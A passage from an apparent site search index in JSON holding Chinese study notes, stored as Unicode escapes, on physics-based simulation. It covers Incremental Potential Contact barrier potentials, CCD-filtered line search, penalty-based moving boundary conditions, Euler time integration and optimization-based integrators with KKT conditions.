\u4e4b\u95f4\u7684\u7b26\u53f7\u8ddd\u79bb\u3002\u901a\u8fc7\u786e\u4fdd \\(d_{ij}\\) \u975e\u8d1f\uff0c\u6211\u4eec\u6709\u6548\u9632\u6b62\u7269\u4f53\u548c\u969c\u788d\u7269\u7684\u7a7f\u900f\u3002</p> <p>\u4e3a\u4e86\u89e3\u51b3 (7.2.1) \u7684\u4e0d\u7b49\u5f0f\u7ea6\u675f\u4f18\u5316\u95ee\u9898\uff0c\u6211\u4eec\u5f15\u5165 Barrier Potential \\(P_b(x)\\)\uff0c\u6765\u5c06\u5176\u8f6c\u6362\u4e3a\u4e0b\u9762\u7684\u65e0\u7ea6\u675f\u4f18\u5316\u95ee\u9898\uff1a</p> \\[\\tag{7.2.2} \\min_x E(x)+h^2P_b(x) \\] <p>Barrier Potential \u7684\u5b9a\u4e49\u5982\u4e0b\uff1a</p> \\[\\tag{7.2.3} \\begin{array}l P_b(x)= \\sum_{i,j} A_i \\hat{d}b( d_{ij}(x))\\\\ b(d_{ij}(x))=\\begin{cases}\\frac{k}{2}\\left( \\frac{d_{ij}}{d}-1\\right)\\ln \\frac{d_{ij}}{d} &amp; d_{ij}\\lt \\hat{d} \\\\ 0 &amp; d_{ij}\\ge \\hat{d} \\end{cases} \\end{array} \\] <ul> <li>\\(b()\\) \u4e3a Barrier Energy Density Function\uff0c\u5f53\u8ddd\u79bb\u63a5\u8fd1\u4e8e 0 \u65f6\uff0c\u6b64\u51fd\u6570\u8d8b\u4e8e\u65e0\u7a77\u5927\uff0c\u63d0\u4f9b\u5f3a\u5927\u7684\u6392\u65a5\u529b\u4ee5\u9632\u6b62\u7a7f\u900f</li> <li>\\(\\hat{d}\\) \u4e3a\u8ddd\u79bb\u9608\u503c</li> <li>\\(k\\) \u4e3a\u63a5\u89e6\u521a\u5ea6\uff08Contact Stiffness\uff09\uff0c\u63a7\u5236\u63a5\u89e6\u529b\u76f8\u5bf9\u8ddd\u79bb\u7684\u53d8\u5316\u7387</li> <li>\\(A_i\\) \u4e3a\u8282\u70b9 \\(i\\) \u7684 Contact Area\uff0c\u662f\u8bbe\u7f6e\u7684\u5173\u952e\u53c2\u6570<ul> <li>\u8ba1\u7b97 \\(P_b(x)\\) \u4f7f\u7528 Volumn Element \\(\\omega_i =A_i \\hat{d}\\) \u52a0\u6743\u6c42\u548c</li> </ul> </li> </ul> <p>\u5e94\u7528\u94fe\u5f0f\u6cd5\u5219\uff0c\u6211\u4eec\u8ba1\u7b97\u5f97\u5230 Barrier Potential \u7684 Gradient \u548c Hessian \u5982\u4e0b\uff1a</p> <p></p>"},{"location":"Accumulation/Physics-Based%20Simulation/Boundary%20Treatments/#filter-line-search","title":"Filter Line Search","text":"<p>\u5728\u8f83\u5927\u65f6\u95f4\u6b65\u957f\u4e2d\uff0cIncremental Potential \u53ef\u80fd\u4f1a\u6709\u591a\u4e2a\u5c40\u90e8\u6781\u5c0f\u503c\uff0c\u8fd9\u79cd\u60c5\u51b5\u53ef\u80fd\u4f1a\u5bfc\u81f4 Tunneling Issue\uff0c\u5373\u56fa\u4f53\u610f\u5916\u7a7f\u8fc7\u969c\u788d\u7269\u3002\u4e3a\u4e86\u51cf\u8f7b\u8fd9\u79cd\u98ce\u9669\uff0c\u6211\u4eec\u5f15\u5165\u4e00\u79cd\u7531 CCD \u9a71\u52a8\u7684\u8fc7\u6ee4\u7ebf\u641c\u7d22\u7b56\u7565\u3002</p>"},{"location":"Accumulation/Physics-Based%20Simulation/Boundary%20Treatments/#penetration-free-trajectory","title":"Penetration-free Trajectory","text":"<p>IPC \u5c06\u4f18\u5316\u8def\u5f84\u89c6\u4e3a\u8fd0\u52a8\u8f68\u8ff9\u7684\u8fd1\u4f3c\uff0c\u5177\u4f53\u6765\u8bf4\uff0c\u5982\u679c\u4f18\u5316\u8fdb\u884c\u4e86 \\(l\\) \u6b21\u8fed\u4ee3\uff0c\u53ef\u4ee5\u7528\u5982\u4e0b\u7b80\u5355\u6298\u7ebf\u8868\u793a\u4f18\u5316\u8def\u5f84\uff1a</p> \\[ \\{(1-\\beta)x^i + \\beta x^{i+1} | \\beta \\in [0,\\alpha],\\ i=0,1,2,...,l\\} \\] <p>\u5176\u4e2d \\(\\alpha\\) \u5373\u4e3a\u7ebf\u641c\u7d22\u4e2d\u66f4\u65b0\u8fed\u4ee3\u53d8\u91cf\u7684\u6b65\u957f \\(x^{i+1}  = x^i + \\alpha p\\)\u3002\u5728\u7ed9\u5b9a\u4e00\u4e2a\u521d\u59cb\u65e0\u7a7f\u900f\u7684 \\(x^i\\)\uff0c\u6211\u4eec\u60f3\u8981\u4fdd\u8bc1 \\(x^i \\rightarrow x^{i+1}\\) \u4e4b\u95f4\u90fd\u662f\u65e0\u7a7f\u900f\u7684\uff0c\u90a3\u4e48\u53ea\u9700\u8981\u5728\u6bcf\u6b21\u8fed\u4ee3\u4e2d\u4f7f\u7528 CCD \u8ba1\u7b97 \\(\\alpha\\) \u7684\u4e0a\u754c\u3002</p> <p>Continuous Collision Detection</p> <p></p> <p>\u73b0\u5728\u6211\u4eec\u6709\u4e86 Filter Backtracing Line Search \u7b97\u6cd5\uff0c\u4e0e\u4ece\u6b65\u957f\u4e3a 1 \u5f00\u59cb\u4e0d\u540c\uff0c\u5b83\u521d\u59cb\u5316 \\(\\alpha\\) \u4e3a \\(\\alpha^C\\)\uff0c\u8fd9\u79cd\u4fee\u6539\u867d\u7136\u7ec6\u5fae\uff0c\u4f46\u610f\u4e49\u91cd\u5927\uff1a</p> <p></p>"},{"location":"Accumulation/Physics-Based%20Simulation/Boundary%20Treatments/#moving-boundary-conditions","title":"Moving Boundary Conditions","text":"<p>\u52a8\u6001\u7684 Collision Objects(CO) \u548c Moving Boundary Conditions \u5728\u8bb8\u591a\u4eff\u771f\u573a\u666f\u4e2d\u81f3\u5173\u91cd\u8981\u3002CO \u53ef\u88ab\u89c6\u4e3a\u4e00\u7ec4 BC \u8282\u70b9\u3002</p> <p>\u5728\u5927\u65f6\u95f4\u6b65\u3001\u9ad8\u901f\u5ea6\u6216\u663e\u8457\u53d8\u5f62\u7684\u60c5\u51b5\u4e0b\uff0c\u76f4\u63a5\u6307\u5b9a BC \u8282\u70b9\u901a\u5e38\u4f1a\u5bfc\u81f4\u7a7f\u900f\u6216\u4f2a\u5f71\u3002\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e9b\u6311\u6218\uff0c\u6211\u4eec\u5f15\u5165 Penalty Method\u3002\u6b64\u65b9\u6cd5\u9010\u6b65\u8c03\u6574\u6a21\u62df\uff0c\u4f7f\u5176\u671d\u7740\u6ee1\u8db3 CO \u548c BC \u7ea6\u675f\u4e14\u907f\u514d\u76f8\u4e92\u7a7f\u6a21\u7684\u53ef\u884c\u96c6\u53d1\u5c55\u3002</p>"},{"location":"Accumulation/Physics-Based%20Simulation/Boundary%20Treatments/#penalty-method","title":"Penalty Method","text":"<p>\u5728\u65f6\u95f4\u6b65 \\(n\\rightarrow n+1\\) \u4e2d\uff0c\u9996\u5148\u6839\u636e\u9884\u8bbe\u7684\u8fd0\u52a8\u89c4\u5219\u6216\u63a7\u5236\u8f93\u5165\u8ba1\u7b97\u51fa\u6bcf\u4e2a BC \u8282\u70b9\u7684\u76ee\u6807\u4f4d\u7f6e \\(\\hat{x}_{k}^{n+1}\\) \uff0c\u5176\u4e2d \\(k\\) \u662f\u8fb9\u754c\u8282\u70b9\u7684\u7f16\u53f7\u3002</p> <p>\u5728\u725b\u987f\u8fed\u4ee3\u4e2d\uff0c\u6211\u4eec\u5b9a\u4e49 Velocity Residual \u7528\u6765\u5224\u65ad\u5f53\u524d\u8fed\u4ee3 \\(x^i\\) \u4e0e\u76ee\u6807\u4f4d\u7f6e\u4e4b\u95f4\u7684\u8ddd\u79bb\uff1a</p> \\[ r_{BC,k}^i = \\frac{1}{h} ||x_k^i - \\hat{x}_k^{n+1}||. \\] <p>\u5f53 \\(r_{BC,k}^i\\) \u7684\u503c\u4f4e\u4e8e\u9884\u8bbe\u5bb9\u5dee \\(\\epsilon\\) \u65f6\uff0c\u5219\u5c06\u8be5\u8282\u70b9\u56fa\u5b9a\u5728\u8be5\u4f4d\u7f6e \\(x_k^i = \\hat{x}_k^{n+1}\\) \uff0c\u7136\u540e\u518d\u5e94\u7528 DOF Elimination Method \u79fb\u9664\u8be5\u70b9\u7684\u81ea\u7531\u5ea6\u3002</p> <p>\u5bf9\u4e8e\u5176\u5b83\u79bb\u76ee\u6807\u4f4d\u7f6e\u8f83\u8fdc\u7684 BC \u8282\u70b9\uff0c\u4e3a\u4e86\u63a8\u52a8\u5176\u5411\u76ee\u6807\u4f4d\u7f6e\u79fb\u52a8\uff0c\u6211\u4eec\u5728 Incremental Potential \u4e2d\u4e3a\u5176\u6dfb\u52a0 Penalty\uff1a</p> \\[\\tag{11.1.1} \\frac{k_M}{2} m_k ||x_k - \\hat{x}_k^{n+1}|| ^2. \\] <ul> <li>\\(m_k\\) \u4e3a\u8282\u70b9\u8d28\u91cf</li> <li>\\(k_M\\) \u4e3a Penalty Stiffness\uff0c\u5141\u8bb8\u4e3b\u89c2\u8bbe\u7f6e</li> </ul> <p>\\(k_M\\) \u7684\u8bbe\u7f6e\u4e0d\u5f53\u53ef\u80fd\u4f1a\u5e26\u6765\u95ee\u9898\uff1a</p> <ul> <li>\\(k_M\\) \u592a\u5c0f\uff0c\u8282\u70b9\u53d7 Penalty \u7684\u5438\u5f15\u529b\u4e0d\u8db3\uff0c\u65e0\u6cd5\u6709\u6548\u9760\u8fd1\u76ee\u6807</li> <li>\\(k_M\\) \u592a\u5927\uff0c\u7cfb\u7edf\u6574\u4f53\u521a\u6027\u8fc7\u5927\uff0c\u5f15\u8d77\u6570\u503c\u4e0d\u7a33\u5b9a\uff0c\u751a\u81f3\u4e0e\u78b0\u649e\u6216\u5176\u5b83\u7ea6\u675f\u4ea7\u751f\u51b2\u7a81</li> </ul> <p>\u4e00\u822c\u8bbe\u7f6e\u5176\u521d\u503c\u4f4e\u4e8e \\(10^6\\)\u3002\u5728\u725b\u987f\u8fed\u4ee3\u4e2d\uff0c\u5f53\u67d0\u4e9b BC \u8282\u70b9\u7684 \\(r_{BC,k}^i\\) \u4ecd\u7136\u8f83\u5927\u65f6\uff0c\u4f1a\u5c06\u5176 \\(k_M\\) \u7ffb\u500d\uff0c\u7136\u540e\u7ee7\u7eed\u6c42\u89e3\uff0c\u77e5\u9053\u6240\u6709 BC \u8282\u70b9\u90fd\u63a5\u8fd1\u5176\u76ee\u6807\u4f4d\u7f6e\u3002</p> <p>\u4e00\u65e6\u6240\u6709 BC \u8282\u70b9\u90fd\u964d\u4f4e\u5230\u5bb9\u5dee\u4e4b\u4e0b\uff0c\u5c31\u53ef\u4ee5\u56fa\u5b9a\u8fd9\u4e9b\u8282\u70b9\uff0c\u5728\u540e\u7eed\u8fed\u4ee3\u4e2d\u5e94\u7528 DOF \u6d88\u9664\u6cd5\u6c42\u89e3\u3002</p>"},{"location":"Accumulation/Physics-Based%20Simulation/Simulation%20with%20Optimization/","title":"Simulation with Optimization","text":""},{"location":"Accumulation/Physics-Based%20Simulation/Simulation%20with%20Optimization/#simulation-with-optimization","title":"Simulation With Optimization","text":"<p> \u7ea6 2451 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 12 \u5206\u949f</p> <p>Range: Chapter 1~4</p>"},{"location":"Accumulation/Physics-Based%20Simulation/Simulation%20with%20Optimization/#discrete-space-and-time","title":"Discrete Space and Time","text":""},{"location":"Accumulation/Physics-Based%20Simulation/Simulation%20with%20Optimization/#solid-geometry","title":"Solid Geometry","text":"<p>\u5728\u73b0\u4ee3\u56fa\u4f53\u6a21\u62df\u9886\u57df\uff0c\u8fde\u63a5\u5b9a\u4e49\u7684\u63cf\u8ff0\u65b9\u6cd5\u662f\u81f3\u5173\u91cd\u8981\u7684\u3002</p> <ul> <li>&lt;1&gt; Mesh of edges or triangles<ul> <li>\u662f\u6709\u9650\u5143\u65b9\u6cd5(FEM)\u6a21\u62df\u7684\u57fa\u7840</li> <li>FEM \u5728 Simulation Accuracy Control \u65b9\u9762\u8868\u73b0\u51fa\u8272\uff0c \u5b83\u76f4\u63a5\u5728\u7f51\u683c\u4e0a\u64cd\u4f5c\uff0c\u65e0\u9700\u4fe1\u606f\u4f20\u8f93\uff0c\u4ece\u800c\u786e\u4fdd\u66f4\u9ad8\u7684\u7cbe\u5ea6</li> <li>\u672c\u4e66\u96c6\u4e2d\u5728\u57fa\u4e8e\u7f51\u683c\u7684\u6709\u9650\u5143\u7ed3\u6784</li> </ul> </li> <li>&lt;2&gt; Uniform grid to compute solid density<ul> <li>\u7528\u4e8e\u6a21\u62df Material Point Method(MPM)</li> <li>MPM \u5728\u7ba1\u7406 Solid Topology \u65b9\u9762\u8f83\u4e3a\u51fa\u8272\uff0c\u4f8b\u5982\u6a21\u62df\u56fa\u4f53\u65ad\u88c2\u7b49\u52a8\u6001\u4e8b\u4ef6</li> </ul> </li> </ul>"},{"location":"Accumulation/Physics-Based%20Simulation/Simulation%20with%20Optimization/#time-integration","title":"Time Integration","text":"<p>\u725b\u987f\u7b2c\u4e8c\u5b9a\u5f8b\u4e3a \\(f=ma\\)\uff0c\u6211\u4eec\u5c06\u5176\u5e94\u7528\u5230\u6bcf\u4e00\u4e2a\u91c7\u6837\u70b9\u4e0a\uff0c\u7528\u77e2\u91cf\u5f62\u5f0f\u7b80\u6d01\u8868\u793a\u4e3a\uff1a</p> \\[\\tag{1.2.1}\\begin{align} \\frac{dx}{dt}=v, \\\\ M \\frac{dv}{dt}=f. \\end{align} \\] <p>\u5176\u4e2d \\(M\\in R^{dn\\times dn}\\) \u662f Mass Matrix\u3002</p> <p>\u5728\u6211\u4eec\u57fa\u4e8e\u7269\u7406\u7684\u6a21\u62df\u4e2d\uff0c\u603b\u662f\u5047\u8bbe\u6211\u4eec\u62e5\u6709\u521d\u59cb\u503c \\(x^0\\) \u548c \\(v^0\\)\uff0c\u4ee5\u53ca\u57fa\u4e8e\u7269\u7406\u6a21\u578b\u53ef\u4ee5\u8ba1\u7b97\u7684\u6bcf\u4e2a\u65f6\u95f4\u6b65\u957f\u7684 \\(f^n\\)\uff0c\u4ee5\u6b64\u6765\u66f4\u65b0 \\(x\\) \u548c \\(v\\)\u3002</p>"},{"location":"Accumulation/Physics-Based%20Simulation/Simulation%20with%20Optimization/#explicit-time-integration","title":"Explicit Time Integration","text":"<p>\u663e\u793a\u79ef\u5206\u901a\u8fc7\u5c06\u5df2\u77e5\u503c\u4ee3\u5165\u7b80\u5355\u516c\u5f0f\u6765\u8ba1\u7b97 \\(x^{n+1}\\) \u548c \\(v^{n+1}\\) \uff0c\u672c\u8282\u4ecb\u7ecd\u4e86 Forward Euler \u548c Symplectic Euler Methods \u4e24\u79cd\u663e\u5f0f\u65b9\u6848\u3002</p> <p>Forward Euler</p> <p>\u6211\u4eec\u5c06\u8fde\u7eed\u7684\u65f6\u95f4\u7cfb\u7edf\u8f6c\u6362\u4e3a\u79bb\u6563\u5f62\u5f0f\uff0c\u91c7\u7528\u524d\u5411\u5dee\u5206\u8fd1\u4f3c\uff0c\u5373\uff1a</p> \\[\\tag{1.4.1} \\begin{align} \\frac{x^{n+1} -x^n}{\\Delta t}= v^{n}, \\\\ M\\frac{v^{n+1} - v^n}{\\Delta t}=f^n. \\end{align} \\] <p>\u8ba1\u7b97\u65f6\uff0c\u5219\u53ef\u4ee5\u901a\u8fc7\u5df2\u77e5\u91cf \\(x^n\\), \\(v^n\\), \\(f^n\\) \u6765\u786e\u5b9a \\(x^{n+1}\\) \u548c \\(v^{n+1}\\) :</p> \\[\\tag{1.4.2} \\begin{array}l x^{n+1} = x^n + \\Delta t v^n, \\\\ v^{n+1} = v^n + \\Delta tM^{-1} f^n. \\end{array} \\] <p>Symplectic Euler</p> <p>Symplectic Euler \u76f8\u6bd4\u4e8e Forwar Euler \u4f5c\u4e86\u4e00\u70b9\u5c0f\u5c0f\u7684\u6539\u8fdb\uff0c\u5b83\u91c7\u7528 \\(v^{n+1}\\) \u6765\u66f4\u65b0 \\(x^{n+1}\\)\uff0c\u5373\uff1a</p> \\[\\tag{1.4.3} \\begin{array}l x^{n+1} = x^n + \\Delta t v^{n+1}, \\\\ v^{n+1} = v^n + \\Delta tM^{-1} f^n. \\end{array} \\]"},{"location":"Accumulation/Physics-Based%20Simulation/Simulation%20with%20Optimization/#implicit-time-integration","title":"Implicit Time Integration","text":"<p>\u4e0e\u663e\u5f0f\u79ef\u5206\u76f8\u6bd4\uff0c\u9690\u5f0f\u79ef\u5206\u9700\u8981\u6c42\u89e3\u4e00\u4e2a\u65b9\u7a0b\u7ec4\u4ee5\u786e\u5b9a \\(x^{n+1}\\) \u548c \\(v^{n+1}\\) \u7684\u503c\uff0c\u8fd9\u79cd\u65b9\u6cd5\u7684\u663e\u8457\u4f18\u70b9\u5c31\u662f\u8f83\u9ad8\u7684\u7a33\u5b9a\u6027\u3002</p> <p>\u9690\u5f0f\u79ef\u5206\u6700\u7b80\u5355\u7684\u5f62\u5f0f\u4e3a Backward Euler\uff0c\u5b83\u7684\u66f4\u65b0\u89c4\u5219\u4e3a\uff1a</p> \\[ \\tag{1.5.1} \\begin{array}l x^{n+1} = x^n + \\Delta t v^{n+1}, \\\\ v^{n+1} = v^n + \\Delta tM^{-1} f^{n+1}. \\end{array} \\] <p>\u5728\u5927\u591a\u6570\u573a\u666f\u4e2d\uff0c\u529b\u4f9d\u8d56\u4e8e\u4f4d\u7f6e\u800c\u4ea7\u751f\uff0c\u5373\u529b\u5411\u91cf\u662f\u4f4d\u7f6e\u5411\u91cf\u7684\u4e00\u4e2a\u51fd\u6570\uff1a\\(f^{n+1} =f(x^{n+1})\\)\u3002\u90a3\u4e48\u5bf9\u4e8e (1.5.1)\uff0c\\(x^{n+1}\\) \u7684\u8ba1\u7b97\u4f9d\u8d56\u4e8e \\(v^{n+1}\\)\uff0c\\(v^{n+1}\\) \u7684\u8ba1\u7b97\u4f9d\u8d56\u4e8e \\(f^{n+1}\\)\uff0c\\(f^{n+1}\\) \u7684\u8ba1\u7b97\u4f9d\u8d56\u4e8e \\(x^{n+1}\\)\uff0c\u8fd9\u79cd\u76f8\u4e92\u4f9d\u8d56\u53ef\u4ee5\u5c06\u95ee\u9898\u8f6c\u6362\u4e3a\u6c42\u89e3\u4e00\u4e2a\u65b9\u7a0b\u7ec4\uff1a</p> \\[\\tag{1.5.2} M(x^{n+1} - x^n - \\Delta tv^n) -\\Delta t^2 f(x^{n+1}) = 0 \\] <p>\u7531\u4e8e \\(f\\) \u548c \\(x\\) \u7684\u5173\u7cfb\u901a\u5e38\u662f\u975e\u7ebf\u6027\u7684\uff0c\u56e0\u6b64\u6c42\u89e3 (1.5.2) \u6211\u4eec\u4e5f\u9700\u8981\u4f7f\u7528\u975e\u7ebf\u6027\u6839\u67e5\u627e\u6280\u672f\uff0c\u4f8b\u5982\u725b\u987f\u6cd5\u3002</p> <p>\u725b\u987f\u6cd5\u5728\u8fed\u4ee3\u8fc7\u7a0b\u4e2d\uff0c\u53ef\u7ebf\u6027\u8fd1\u4f3c \\(f(x^{n+1})\\) \u4e3a \\(f(x^i)+ (x^{n+1} -x^i) \\nabla f(x^i)\\)\uff0c\u5176\u4e2d \\(x^i\\) \u662f\u7b2c i \u6b21\u8fed\u4ee3\u5f97\u5230\u7684\u503c\uff0c\u5b83\u5728\u5faa\u73af\u5f00\u59cb\u524d\u88ab\u8d4b\u503c\u4e3a \\(x^n\\)\u3002\u4f2a\u4ee3\u7801\u5982\u4e0b\uff1a</p> <p></p>"},{"location":"Accumulation/Physics-Based%20Simulation/Simulation%20with%20Optimization/#optimization-framework","title":"Optimization Framework","text":""},{"location":"Accumulation/Physics-Based%20Simulation/Simulation%20with%20Optimization/#optimization-time-integrator","title":"Optimization Time Integrator","text":"<p>\u4f7f\u7528 Backward Euler \u65f6\uff0c\u6bcf\u4e2a\u65f6\u95f4\u6b65\u90fd\u9700\u8981\u6c42\u89e3\u4e00\u4e2a\u975e\u7ebf\u6027\u65b9\u7a0b\u7ec4\uff0c\u4e5f\u76f8\u5f53\u4e8e\u6c42\u89e3\u4e00\u4e2a\u4f18\u5316\u95ee\u9898\uff1a</p> \\[\\tag{2.1.1} \\begin{array}l x^{n+1}= argmin_x E(x) \\\\ E(x) = \\frac{1}{2} ||x- \\widetilde{x}^n||_M ^2 + \\Delta t^2 P(x) \\end{array} \\] <ul> <li>\\(\\widetilde{x}^n = x^n +\\Delta t v^n\\)</li> <li>\\(||x-\\widetilde{x}^n||_M ^2 = \\frac{1}{2}(x-\\widetilde{x}^n) ^T M(x- \\widetilde{x}^n)\\) <ul> <li>\u8868\u793a\u60ef\u6027\u9879</li> </ul> </li> <li>\\(\\frac{\\partial P}{\\partial x}(x) = -f(x)\\)<ul> <li>\\(P(x)\\) \u5373\u4e3a\u529b \\(f(x)\\) \u5bf9\u5e94\u7684 Potential Energy</li> </ul> </li> </ul> <p>\u6211\u4eec\u79f0 \\(E(x)\\) \u4e3a Incremental Potential\uff0cIP \u7684 Local Minimum \u5904\uff0c\u5373 \\(\\frac{\\partial E}{\\partial x}(x ^{n+1}) =0\\)\uff0c\u5bf9\u5e94\u7740\u516c\u5f0f (1.5.2)\u3002</p> <p>\u5c06\u65f6\u95f4\u79ef\u5206\u95ee\u9898\u89c6\u4e3a\u4f18\u5316\u95ee\u9898\uff0c\u662f\u6211\u4eec\u80fd\u591f\u5229\u7528\u6210\u719f\u7684\u4f18\u5316\u65b9\u6cd5\u7a33\u5065\u7684\u83b7\u53d6\u89e3</p>"},{"location":"Accumulation/Physics-Based%20Simulation/Simulation%20with%20Optimization/#dirichlet-boundary-conditions","title":"Dirichlet Boundary Conditions","text":"<p>\u5728\u6a21\u62df\u8fc7\u7a0b\u4e2d\uff0c\u901a\u5e38\u9700\u8981\u5728\u6bcf\u4e2a\u65f6\u95f4\u6b65\u63a7\u5236\u56fa\u4f53\u4e0a\u67d0\u4e9b\u70b9\u7684\u4f4d\u7f6e\uff0c\u4f8b\u5982\u5c06\u4e00\u7ec4\u4e0d\u53ef\u79fb\u52a8\u8282\u70b9\u56fa\u5b9a\u6216\u662f\u79fb\u52a8\u7279\u5b9a\u8282\u70b9\u4ee5\u56fa\u5b9a\u8def\u5f84\u3002\u8fd9\u79cd\u63a7\u5236\u79f0\u4e3a Dirichlet Boundary Conditions(BC)\uff0c\u8fd9\u4e9b\u6761\u4ef6\u53ef\u4ee5\u5728\u4f18\u5316\u4e2d\u8868\u793a\u4e3a Linear Equality Constraints\uff1a</p> \\[\\tag{2.2.1} min _x E(x),\\ \\ \\  s.t.\\ Ax=b \\] <p>\u65b9\u7a0b (2.2.1) \u7684\u77e9\u9635 \\(A\\) \u901a\u5e38\u662f\u4e00\u4e2a \\(m\\times dn\\) \u77e9\u9635\uff0c\u5176\u4e2d \\(m\\le dn\\), \\(m\\ mod\\ d =0\\)\uff1b\u76f8\u5e94\u7684\uff0c\\(b\\) \u662f\u4e00\u4e2a \\(m\\times 1\\) \u7684\u5411\u91cf\u3002</p> <p>\u53ef\u4ee5\u901a\u8fc7\u62c9\u683c\u6717\u65e5\u7b97\u6cd5\u8f6c\u6362\u6210 KKT Condition\uff1a</p> \\[\\tag{2.2.2} \\begin{align} \\nabla E(x)- A^T \\lambda =0\\\\ Ax=b \\end{align} \\] <p>\u5176\u4e2d \\(\\lambda \\in R^m\\) \u8868\u793a\u62c9\u683c\u6717\u65e5\u4e58\u5b50 (Lagrange Multiplier)\u3002</p>"},{"location":"Accumulation/Physics-Based%20Simulation/Simulation%20with%20Optimization/#contact","title":"Contact","text":"<p>\u4e3a\u4e86\u51c6\u786e\u6a21\u62df\u56fa\u4f53\uff0c\u786e\u4fdd\u5b83\u4eec\u4e0d\u76f8\u4e92\u7a7f\u900f\u662f\u81f3\u5173\u91cd\u8981\u7684\u3002</p> <p>\u4e3a\u4e86\u907f\u514d\u78b0\u649e\u6216\u7a7f\u900f\uff0c\u6211\u4eec\u53ef\u4ee5\u786e\u4fdd\u7269\u4f53\u8868\u9762\u7684\u8ddd\u79bb\u6c38\u8fdc\u4e0d\u4f1a\u51cf\u5230\u96f6\u3002\u6211\u4eec\u4f7f\u7528\u4e0d\u7b49\u5f0f\u7ea6\u675f\u6765\u6a21\u62df\u8fd9\u4e2a\u573a\u666f\uff0c\u56e0\u6b64\u65f6\u95f4\u79ef\u5206\u95ee\u9898\u53ef\u4ee5\u8868\u8ff0\u5982\u4e0b\uff1a</p> \\[\\tag{2.3.1} min_x E(x)\\ \\ s.t.\\ Ax=b\\ and\\ \\forall k, c_k(x) \\ge \\epsilon \\] <p>\\(c_k\\) \u8868\u793a\u8868\u9762\u7279\u5b9a\u533a\u57df\u5bf9\u4e4b\u95f4\u7684 Distance\uff0c\\(\\epsilon \\rightarrow 0\\) \u662f\u4e00\u4e2a\u5f88\u5c0f\u7684\u6b63\u6570\u3002</p> <p>\u5bf9\u4e8e\u4f18\u5316\u95ee\u9898 (2.3.1) \u7684\u5c40\u90e8\u6700\u5c0f\u5904\uff0c\u6211\u4eec\u9075\u5faa\u5982\u4e0b KKT Condition\uff1a</p> \\[\\tag{2.3.2} \\begin{align} \\nabla E(x) -A^T\\lambda -\\sum_k \\gamma_k \\nabla c_k(x)=0, \\\\ Ax=b, \\\\ \\forall k,\\ c_k(x) \\ge \\epsilon,\\ \\gamma_k \\ge 0,\\ \\gamma_k (c_k(x)-\\epsilon) =0. \\end{align} \\] <p>\\(\\gamma_k\\) \u662f\u7ea6\u675f \\(c_k(x) \\ge \\epsilon\\) \u7684\u62c9\u683c\u6717\u65e5\u4e58\u5b50\u3002\\(\\nabla c_k(x)\\) \u6307\u5411\u63a5\u89e6\u5bf9 \\(k\\) \u7684\u63a5\u89e6\u529b\u65b9\u5411\uff0c\u5c06\u8fd9\u4e2a\u65b9\u5411\u4e0e \\(\\gamma_k\\) \u7684\u5927\u5c0f\u7ed3\u5408\uff0c\u6211\u4eec\u5f97\u5230\u8be5\u70b9\u5b9e\u9645\u7684\u63a5\u89e6\u529b\u3002</p> <p>Complementarity Slackness Condition \\(\\gamma_k (c_k(x) -\\epsilon) =0\\)</p> <ul> <li>\u4e92\u8865\u677e\u5f1b\u6761\u4ef6\u786e\u4fdd\u4e86\u53ea\u6709\u5f53\u56fa\u4f53\u63a5\u89e6\u65f6(\\(c_k(x)=\\epsilon\\))\u624d\u5b58\u5728\u63a5\u89e6\u529b\uff0c\u800c\u672a\u63a5\u89e6\u65f6\u4e0d\u5b58\u5728\u63a5\u89e6\u529b(\\(\\gamma_k=0\\))\u3002</li> <li>\u4e92\u8865\u677e\u5f1b\u6761\u4ef6\u8868\u660e\uff0c\u53ea\u6709 Active Set \u5185\u7684\u7ea6\u675f\u624d\u4f1a\u8868\u73b0\u51fa\u975e\u96f6\u62c9\u683c\u6717\u65e5\u4e58\u5b50 \\(\\gamma_k\\)\u3002\u8fd9\u4e5f\u4e3a\u4e0d\u7b49\u5f0f\u7ea6\u675f\u4f18\u5316\u95ee\u9898\u5e26\u6765\u4e86\u7ec4\u5408\u96be\u5ea6\u3002</li> </ul> <p>\u5728\u89e3\u51b3\u4e0d\u7b49\u5f0f\u7ea6\u675f\u4f18\u5316\u95ee\u9898\u65b9\u9762\uff0c\u6709\u5404\u79cd\u6280\u672f\u53ef\u7528\uff0c\u6bcf\u79cd\u65b9\u6cd5\u90fd\u6709\u5176\u72ec\u7279\u7684\u89e3\u51b3\u65b9\u6848\uff1a</p> <ul> <li>&lt;1&gt; Primal-Dual Methods: \u901a\u8fc7\u8fed\u4ee3\uff0c\u5229\u7528\u539f\u59cb\u95ee\u9898\u548c\u5bf9\u5076\u95ee\u9898\u4e4b\u95f4\u7684\u5173\u7cfb\u6765\u6539\u8fdb\u521d\u59cb\u89e3\u3002<ul> <li>\u6709\u6548\u4f46\u4e0d\u4e00\u5b9a\u9ad8\u6548\u3001\u7b80\u5355</li> </ul> </li> <li>&lt;2&gt; Projected Steepest Descent Methods: \u662f\u7ecf\u5178\u6700\u901f\u4e0b\u964d\u6cd5\u7684\u6539\u8fdb\uff0c\u7528\u4e8e\u89e3\u51b3\u7ea6\u675f\u6761\u4ef6\u3002<ul> <li>\u5728\u6bcf\u6b21\u8fed\u4ee3\u4e2d\uff0c\u7b97\u6cd5\u6cbf\u7740\u6700\u901f\u4e0b\u964d\u65b9\u5411\u79fb\u52a8\u3002\u5982\u679c\u56e0\u4e3a\u7ea6\u675f\u6761\u4ef6\u800c\u504f\u79fb\uff0c\u5219\u5c06\u5176\u6295\u5f71\u56de\u53ef\u884c\u96c6(Feasible Set)</li> <li>\u7b80\u5355\u76f4\u63a5\uff0c\u4f46\u662f\u67d0\u4e9b\u7ea6\u675f\u6761\u4ef6\u96be\u4ee5\u6295\u5f71\u3001\u6536\u655b\u7f13\u6162</li> </ul> </li> <li>&lt;3&gt; Interior-Point Methods: \u4e5f\u6210\u4e3a Barrier Methods\uff0c\u5b83\u901a\u8fc7 Barrier Function \u6765\u5c06\u89e3\u5f15\u5bfc\u81f3\u53ef\u884c\u533a\u57df\u7684\u5185\u90e8\u3002<ul> <li>\u8fd9\u79cd\u65b9\u6cd5\u5c06\u7ea6\u675f\u95ee\u9898\u8f6c\u6362\u4e3a\u4f20\u7edf\u65e0\u7ea6\u675f\u95ee\u9898</li> </ul> </li> </ul> <p>\u672c\u4e66\u4e13\u6ce8\u4e8e\u4e00\u4e2a\u7a33\u5065\u800c\u51c6\u786e\u7684 Contact Modeling Method\uff0c\u79f0\u4e3a Incremental Potential Contact(IPC)\u3002IPC 